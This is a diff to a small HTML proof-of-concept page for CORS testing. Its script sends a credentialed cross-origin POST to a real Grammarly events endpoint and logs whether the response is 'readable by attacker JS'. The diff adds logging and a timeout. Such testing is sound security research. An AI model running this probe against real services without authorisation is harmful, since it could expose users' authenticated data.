@@ -2,15 +2,34 @@
 <html>
 <body>
 <h1>CORS PoC</h1>
-<pre id="result">Testing...</pre>
+<pre id="result">Starting...</pre>
 
 <script>
 (async () => {
+  const output = document.getElementById("result");
+
+  function log(msg) {
+    output.textContent += "\n" + msg;
+    console.log(msg);
+  }
+
+  output.textContent = "Starting CORS test...";
+
+  const controller = new AbortController();
+
+  const timeout = setTimeout(() => {
+    log("TIMEOUT: request did not complete within 10 seconds");
+    controller.abort();
+  }, 10000);
+
   try {
+    log("About to call fetch()...");
+
     const r = await fetch("https://gnar.grammarly.com/events", {
       method: "POST",
       mode: "cors",
       credentials: "include",
+      signal: controller.signal,
       headers: {
         "Content-Type": "application/json"
       },
@@ -36,17 +55,23 @@
       })
     });
 
+    clearTimeout(timeout);
+
+    log("fetch() completed");
+    log("Status: " + r.status);
+    log("Response readable by attacker JS: YES");
+
     const body = await r.text();
 
-    document.getElementById("result").textContent =
-      "Status: " + r.status + "\n" +
-      "Response readable by attacker JS: YES\n\n" +
-      "Response body:\n" +
-      (body || "[empty response body]");
+    log("Response body:");
+    log(body || "[empty response body]");
 
   } catch (e) {
-    document.getElementById("result").textContent =
-      "CORS blocked/error:\n" + e;
+    clearTimeout(timeout);
+
+    log("FETCH FAILED");
+    log("Name: " + e.name);
+    log("Message: " + e.message);
   }
 })();
 </script>
